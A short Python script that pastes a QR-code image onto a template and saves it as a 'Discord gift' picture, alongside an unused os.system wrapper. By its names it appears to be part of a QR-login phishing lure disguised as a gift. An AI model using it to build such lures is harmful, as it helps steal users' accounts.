
from time import *
import os 
from PIL import Image

def cmd(a):
    os.system(a)

def paste_template():
    im1 = Image.open('qr-template/template.png', 'r')
    im2 = Image.open('qr.png', 'r')
    im1.paste(im2, (110, 402))
    im1.save('qr-template/discord_gift.png', quality=95)

paste_template()